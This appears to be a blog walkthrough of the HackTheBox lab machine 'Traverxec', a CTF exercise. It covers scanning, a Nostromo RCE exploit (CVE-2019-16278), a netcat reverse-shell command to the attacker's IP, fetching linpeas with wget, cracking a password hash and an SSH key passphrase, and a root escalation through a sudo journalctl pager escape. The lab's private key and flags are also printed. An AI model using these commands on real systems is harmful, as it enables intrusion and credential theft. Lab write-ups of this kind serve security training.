---
title: "HTB Walkthrough: Traverxec"
date: 2022-07-11T22:46:30-04:00 
categories:
  - HackTheBox
header:
  teaser: /assets/images/HTB/traverxec/traverxec.png
tags:
  - Easy
  - Linux Host
  - SSH
  - Nostromo
  - JohnTheRipper
  - Password Cracking
  - Sudo Exploitation
  - ssh2john
  - RCE
---

![Traverxec Logo](/assets/images/HTB/traverxec/traverxec.png)  

---

## Initial NMap Port Scans  


Let's go ahead and run our port scanner to identify running TCP services.  

### TCP  


```bash
$ sudo nmap -sS -A -O -p- 10.10.10.165 | tee nmap-tcp-full.log

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 22:02 UTC
Nmap scan report for 10.10.10.165
Host is up (0.0088s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
```  

Okay, so we see two open TCP services: OpenSSH running on port 22, and an unusual webserver, nostromo version 1.9.6, running on http port 80.  

### UDP  


It is always important to check for active UDP services, when able:  

```bash
└─$ sudo nmap -sU -A --top-ports=100 10.10.10.165 | tee nmap-udp-top100.log

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 22:12 UTC
Nmap scan report for 10.10.10.165
Host is up (0.0093s latency).
All 100 scanned ports on 10.10.10.165 are in ignored states.
Not shown: 100 open|filtered udp ports (no-response)
Too many fingerprints match this host to give specific OS details
```  

Scanning the top 100 UDP ports with NMap returned nothing. Let's move on and we can return to this if need be.  


## Scanning Port 80  


### Nikto Scan  


Let's run Nikto on Port 80 to search for common web vulnerabilities/weaknesses:  

```bash
$ nikto -h 10.10.10.165 -p 80 | tee nikto.log

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.165
+ Target Hostname:    10.10.10.165
+ Target Port:        80
+ Start Time:         2022-07-11 22:28:31 (GMT0)
---------------------------------------------------------------------------
+ Server: nostromo 1.9.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
```  

Nikto doesn't really reveal anything new or interesting to us here.  

### CURL Webpage Header

Using the CURL command, we can get an idea of what to expect from the website, mostly by viewing the header:  

```bash
└─$ curl http://10.10.10.165  
                                     
<!DOCTYPE html>
<html lang="en">
<head>

  <meta charset="utf-8">
  <title>TRAVERXEC</title>
  <meta content="width=device-width, initial-scale=1.0" name="viewport">
  <meta content="" name="keywords">
  <meta content="" name="description">
  
  <!-- Favicons -->
  <link href="img/favicon.png" rel="icon">
  <link href="img/apple-touch-icon.png" rel="apple-touch-icon">

  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700,900" rel="stylesheet">

  <!-- Bootstrap CSS File -->
  <link href="lib/bootstrap/css/bootstrap.min.css" rel="stylesheet">

  <!-- Libraries CSS Files -->
  <link href="lib/ionicons/css/ionicons.min.css" rel="stylesheet">
  <link href="lib/prettyphoto/css/prettyphoto.css" rel="stylesheet">
  <link href="lib/hover/hoverex-all.css" rel="stylesheet">

  <!-- Main Stylesheet File -->
  <link href="css/style.css" rel="stylesheet">

  <!-- =======================================================
    Template Name: Basic
    Template URL: https://templatemag.com/basic-bootstrap-personal-template/
    Author: TemplateMag.com
    License: https://templatemag.com/license/
  ======================================================= -->
</head>
```  

Right off the bat, we are seeing little information other than this looks like a generic template website.  

### View Homepage in Browser  

Just as we found from curling the header, 10.10.10.165:80/ doesn't have any real content:  

![Web Homepage](/assets/images/HTB/traverxec/port80.png)  

 
### FFUF Web Directory Fuzzing  

Now its time to start locating some existing directories/subdirectories for 10.10.10.165/.  

I decided to use FFUF (Fuzz Faster U Fool) directory buster to brute force existing directories.  

```bash
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.165/FUZZ -o ffuf.log

#                       [Status: 200, Size: 15674, Words: 3910, Lines: 401, Duration: 40ms]
                        [Status: 200, Size: 15674, Words: 3910, Lines: 401, Duration: 45ms]
css                     [Status: 301, Size: 314, Words: 19, Lines: 14, Duration: 10ms]
lib                     [Status: 301, Size: 314, Words: 19, Lines: 14, Duration: 9ms]
js                      [Status: 301, Size: 314, Words: 19, Lines: 14, Duration: 7ms]
```  

These results didn't return much, we see that the homepage '/' and '/#' returned a status code of 200 (good).  


## OpenSSH Reconnaissance  


I looked at Searchsploit results for vulnerable OpenSSH versions, but didn't find any specific to 7.9p1. However, an authenticated privilege escalation (PE) vulnerability appeared for an unspecified version of Debian OpenSSH (the one we detected via nmap). Meaning, if we can gain low level access, this may be a plausible PE vector for later, so I'll save it.  

![OpenSSH Searchsploit](/assets/images/HTB/traverxec/openssh.png)  

## Nostromo Web Server Reconnaissance  

First, let's use Searchsploit to see if there is an existing vulnerability for our Nostromo service version:  

```bash
└─$ searchsploit nostromo                                                                                      130 ⨯
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit)               | multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution                                             | multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution               | linux/remote/35466.sh
----------------------------------------------------------------------------------- ---------------------------------
```  

As we see, there is a Remote Code Execution (RCE) exploit available in Python for our exact version number: nostromo 1.9.6. This looks very good. Let's download and open it to view the code.  

Use -m and the file number to download the specific exploit:  

```bash
└─$ searchsploit -m 47837 && gedit 47837.py
  Exploit: nostromo 1.9.6 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47837
     Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py
File Type: Python script, ASCII text executable
```  

Looking at the file with gedit, we identify the CVE as 2019-16278. Additionally, the remote exploit code looks very easy to run. Just type 'python filename.py' followed by the IP (10.10.10.165), port (80) and command you wish to execute (i.e. "cat /etc/passwd").  

![CVE-2019-16278 RCE Code](/assets/images/HTB/traverxec/cve-2019-16278.png)  

## Initial Access via CVE-2019-16278  

So, let's try this exploit out and see if we can make a connection. I'm going to start by sending it the 'whoami' command to get our current user's name.  

```bash
└─$ python 47837.py 10.10.10.165 80 "whoami"

www-data
```  

Okay, it works. I noticed the remote system has netcat installed by sending it the 'ls' command (current directory is /usr/bin, which stores application folders).  

So, let's start a listener with netcat on our system and send it command that uses netcat to connect back to us, giving us a remote shell.  

```bash
└─$ nc -nvlp 8899

# In another terminal:
# Use your IP in the command that you send, to connect back to yourself: 
└─$ python 47837.py 10.10.10.165 80 "nc -e /bin/sh 10.10.14.27 8899"

# Now we have a shell
```  

Additionally, here is a link to a [reverse shell cheat-sheet on GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md).  

### Enumerating WWW-Data  

First, we are missing some information from our commands and generally, this makes me think of spawning a pty shell. Let's go ahead and do that with a quick python command:  

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```  

Since I want to get some more information about this machine quickly, I will transfer over a copy of linpeas.sh (found on GitHub) to enumerate it and print the results to a file. Let's do it by hosting the file with Apache2 and grabbing it with Wget.  


```bash
My Machine:
# Start up our local web server to serve Linpeas: 

$ cp ./linpeas.sh /var/www/html
$ sudo service apache2 start

HTB Machine:
# Download Linpeas from our Apache webserver to /tmp:
$ cd /tmp 
$ wget http://10.10.14.27/linpeas.sh -O linpeas.sh

# Give executable writes to www-data user and run Linpeas:
$ chmod 777 linpeas.sh
$ ./linpeas.sh
```  
While I am scrolling through the results of this scan, I am looking for my most likely result to help escalate privileges. The first huge thing I notice is that Linpeas came across a password hash for the user David:  

![David's Credentials](/assets/images/HTB/traverxec/david-credentials.png)  


### Password Cracking with JohnTheRipper

On my local machine, I added the usernmae:hash combination to a new file named hash.txt. Then, I cracked it with JohnTheRipper and my personal copy of rockyou.txt.  

```bash
└─$ john --wordlist=~/tools/rockyou.txt hash.txt                                                                                                                                                                                         1 ⨯
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Nowonly4me       (david)     
1g 0:00:01:11 DONE (2022-07-16 23:12) 0.01391g/s 147229p/s 147229c/s 147229C/s Noyoo..Noury
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```  

Unfortunately, this is not David's profile password for the machine. In the image above, we see it came out of /var/nostromo/conf, which is the webserver's file. So, maybe there is a way to gain access this way.  

Since the www-data user primarily has access to web-related content, let's examine the content in /var/nostromo.  

### Enumerating Nostromo Configuration Files  

There is another interesting file here ni /var/nostromo/conf:  

```bash
$ cat nhttpd.conf

# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```  

We have our user david listed here as serveradmin, and since I found his hashed password here, it is most likely for his server login. A lot of this information looks juicy but I'm not sure exactly what to do with it yet.  

I started by Googling 'nostromo config files' which didn't return much besides the manual for nostromo web server, [here](https://www.nazgul.ch/dev/nostromo_man.html).  

I started looking through it for things we have in our config file, and this ended up being the most useful:  


![Nostromo Manual Screenshot](/assets/images/HTB/traverxec/nostromo-man.png)  


Here, you can see that nostromo enables file hosting over http via home directories, via /~username. So I tried '10.10.10.165/~david':  


![David's Nostromo Home](/assets/images/HTB/traverxec/nostromo-david.png)  


In my terminal, I can navigate to david's home directory (/home/david), but can't view any of the files or folders in it.  

Additionally, I tried to get an existing ssh key for david by navigating to /home/david/.ssh but it said 'forbidden'. Forbidden means it exists, where 'not found' would indicate it doesn't exist.  

After playing around in my browser a bit more and getting bored of it, I ended up trying to navigate to /home/david/public_www (from our nhttpd.conf file).  

This was successful, and led me to ssh credentials:  

```bash
$ pwd
/home/david/public_www

$ ls -la
total 16
drwxr-xr-x 3 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area

$ cd protected-file-area

$ pwd
/home/david/public_www/protected-file-area

$ ls -la
total 16
drwxr-xr-x 2 david david 4096 Oct 25  2019 .
drwxr-xr-x 3 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david   45 Oct 25  2019 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz

$ cat .htaccess
realm David's Protected File Area. Keep out!

#Let's move this to /tmp and rename it something shorter:
$ cp backup-ssh-identity-files.tgz /tmp/ssh-files.tgz
```  
## Privilege Escalation to User David  

Now that we have this compressed .tgz folder in a place that we have better access to, we can extract it with tar:  

```bash
$ tar -xvzf /tmp/ssh-files.tgz

$ cd /tmp/home/david/.ssh

$ cat id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
-----END RSA PRIVATE KEY-----
```  

The rest of this process is pretty standard to logging in with SSH. Next, I copied this id_rsa into a local file on my pc named id_rsa and turned it into a hash with SSH2John, then cracked it with John:  

```bash
└─$ ssh2john id_rsa > ssh-hash.txt

└─$ john --wordlist=~/tools/rockyou.txt ssh-hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)     
1g 0:00:00:00 DONE (2022-07-17 01:48) 16.66g/s 2666p/s 2666c/s 2666C/s carolina..david
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```  

So david's password for his private key is "hunter". Now we can login via SSH by providing -i. However, since its password-protected, there is one more step. We need to modify the permissions of the id_rsa file or it will be rejected. Let's do that using chmod:  


```bash
$ chmod 600 id_rsa

$ ssh david@10.10.10.165 -i id_rsa

Enter passphrase for key 'id_rsa': hunter
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$
```  

Success. Let's grab the user flag real quick:

```bash
david@traverxec:~$ pwd
/home/david
david@traverxec:~$ ls -la
total 36
drwx--x--x 5 david david 4096 Oct 25  2019 .
drwxr-xr-x 3 root  root  4096 Oct 25  2019 ..
lrwxrwxrwx 1 root  root     9 Oct 25  2019 .bash_history -> /dev/null
-rw-r--r-- 1 david david  220 Oct 25  2019 .bash_logout
-rw-r--r-- 1 david david 3526 Oct 25  2019 .bashrc
drwx------ 2 david david 4096 Oct 25  2019 bin
-rw-r--r-- 1 david david  807 Oct 25  2019 .profile
drwxr-xr-x 3 david david 4096 Oct 25  2019 public_www
drwx------ 2 david david 4096 Oct 25  2019 .ssh
-r--r----- 1 root  david   33 Oct 25  2019 user.txt
david@traverxec:~$ cat user.txt
7db0b48469606a42cec20750d9782f3d
```  


## Privilege Escalation to Root  

So, earlier while going over my linpeas scan, I noticed an outdated sudo version, which is commonly taken advantage of for privilege escalation. I Googled sudo version 1.8.27 and came across a security bypass vulnerability.  

### Security Bypass CVE-2019-14287  


This bug affects sudo version 1.8.27 and the exploit code is posted [here](https://www.exploit-db.com/exploits/47502) on exploit-db.  

I copied the code and echoed it into a new file in /home/david:  

```bash
david@traverxec:~$ touch sudo-esc.py

# Paste the code in from exploit-db
# Run it with 'python3 sudo-esc.py'

# But I ran into this error:

sudo: unknown user: #-1
sudo: unable to initialize policy plugin
```  

So, I needed to try something else.  

### Additional Enumeration  

I tried to see which applications I could run with sudo (no password, since I don't have one for david), with the command 'sudo -l', but this required a password...  

Moving on, I used the find command to list all directories writable by david:  

```bash
find / -writable -type d 2>/dev/null

# Which returned:

/run/user/1000
/run/user/1000/systemd
/run/lock
/dev/mqueue
/dev/shm
/proc/12286/task/12286/fd
/proc/12286/fd
/proc/12286/map_files
/home/david
/home/david/.ssh
/home/david/public_www
/home/david/public_www/protected-file-area
/home/david/bin
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope
/tmp
/tmp/.ICE-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.Test-unix
/tmp/.font-unix
/var/tmp
```  


The only directory in David's home we haven't seen yet is bin, so I went there first.  


```bash
david@traverxec:~/bin$ ls -la
total 16
drwx------ 2 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Jul 16 22:24 ..
-r-------- 1 david david  802 Oct 25  2019 server-stats.head
-rwx------ 1 david david  363 Oct 25  2019 server-stats.sh
david@traverxec:~/bin$ cat server-stats.head
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""' 

david@traverxec:~/bin$ cat server-stats.sh

#!/bin/bash
cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 

david@traverxec:~/bin$ ./server-stats.sh

                                                                          .----.                                    
                                                              .---------. | == |                                    
   Webserver Statistics and Data                              |.-"""""-.| |----|                                    
         Collection Script                                    ||       || | == |                                    
          (c) David, 2019                                     ||       || |----|                                    
                                                              |'-.....-'| |::::|                                    
                                                              '"")---(""' |___.|                                    
                                                             /:::::::::::\"    "                                    
                                                            /:::=======:::\                                         
                                                        jgs '"""""""""""""'                                         
                                                                                                                    
Load:  23:11:39 up  7:18,  1 user,  load average: 0.02, 0.01, 0.00                                                  
                                                                                                                    
Open nhttpd sockets: 5                                                                                              
Files in the docroot: 117                                                                                           
                                                                                                                    
Last 5 journal log lines:                                                                                           
-- Logs begin at Sat 2022-07-16 15:52:47 EDT, end at Sat 2022-07-16 23:11:39 EDT. --                                
Jul 16 18:50:07 traverxec sudo[11995]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/1 ruser=www-data rhost=  user=www-data                                                                          
Jul 16 18:50:20 traverxec sudo[12001]: www-data : unknown user: #-1                                                 
Jul 16 19:35:35 traverxec sudo[12097]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/2 ruser=www-data rhost=  user=www-data                                                                          
Jul 16 20:59:09 traverxec su[12190]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/2 ruser=www-data rhost=  user=david                                                                                      
Jul 16 20:59:10 traverxec su[12190]: FAILED SU (to david) www-data on pts/2                                         
# /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Sat 2022-07-16 15:52:47 EDT, end at Sat 2022-07-16 23:12:11 EDT. --
Jul 16 18:50:07 traverxec sudo[11995]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/
Jul 16 18:50:20 traverxec sudo[12001]: www-data : unknown user: #-1
Jul 16 19:35:35 traverxec sudo[12097]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/
Jul 16 20:59:09 traverxec su[12190]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/2 rus
Jul 16 20:59:10 traverxec su[12190]: FAILED SU (to david) www-data on pts/2
```  

This is interesting because the bash script (.sh) calls sudo, then runs journalctl, with a -n5 tag and -unostromo.service. Piping it into cat after isn't so valuable here.  
What took me the longest was figuring out that I needed to run the individual commands without piping them into /usr/bin/cat, like the script does. If I run them this way, I get an opportunity to enter a Unix binary function.  

I need a Unix binary function to bypass security and priv-esc to root, and oftentimes it ends up being '!/bin/sh'. Using [GTFOBins](https://gtfobins.github.io/) to confirm, it is !/bin/sh.  

### Root Flag  

So, let's go ahead and run the individual commands and insert our function:  

```bash
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service   
                                 
-- Logs begin at Sat 2022-07-16 15:52:47 EDT, end at Sat 2022-07-16 23:08:14 EDT. --                                
Jul 16 18:50:07 traverxec sudo[11995]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/
Jul 16 18:50:20 traverxec sudo[12001]: www-data : unknown user: #-1                                                 
Jul 16 19:35:35 traverxec sudo[12097]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/
Jul 16 20:59:09 traverxec su[12190]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/2 rus
Jul 16 20:59:10 traverxec su[12190]: FAILED SU (to david) www-data on pts/2    
                                     
!/bin/sh
# whoami
                                                                                                            
root

# cd /root
# ls
nostromo_1.9.6-1.deb  root.txt
# cat root.txt
9aa36a6d76f785dfd320a478f6e0d906
```  

Thank you for reading and I hope you enjoyed the walkthrough.  


